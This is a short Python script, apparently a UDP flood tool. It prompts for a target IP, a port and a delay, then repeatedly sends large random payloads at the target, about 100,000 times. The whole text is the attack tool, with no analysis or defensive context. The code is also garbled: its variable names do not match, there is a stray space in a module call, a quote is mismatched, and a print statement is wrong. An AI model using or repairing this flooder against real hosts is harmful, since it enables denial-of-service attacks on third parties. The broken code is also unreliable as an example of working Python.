import socket
import random
import time

S = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tp = input("Target IP: ")
port = int(input("Target Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100*1000):
   s.send(random. urandom(10)*1000)
   print(f"Send: {1}", end="\r')
   time.sleep(sleep)
